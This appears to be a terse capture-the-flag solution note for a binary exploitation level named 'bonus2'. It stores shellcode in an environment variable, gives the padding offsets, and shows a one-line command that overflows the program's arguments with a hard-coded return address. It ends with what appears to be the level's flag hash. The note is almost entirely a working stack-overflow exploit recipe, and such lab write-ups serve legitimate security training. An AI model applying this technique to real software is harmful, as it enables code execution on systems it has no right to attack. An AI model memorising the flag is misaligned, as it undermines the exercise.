export lang=shellcode
get lang adress in gdb
first arg = 30 padding + addr shellcode + 6 padding
2nd arg = 26 padding

./bonus2 $(python -c 'print "A" _ 30 + "\x24\xfd\xff\xbf" + "B" _ 6') $(python -c 'print "C" \* 26')
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
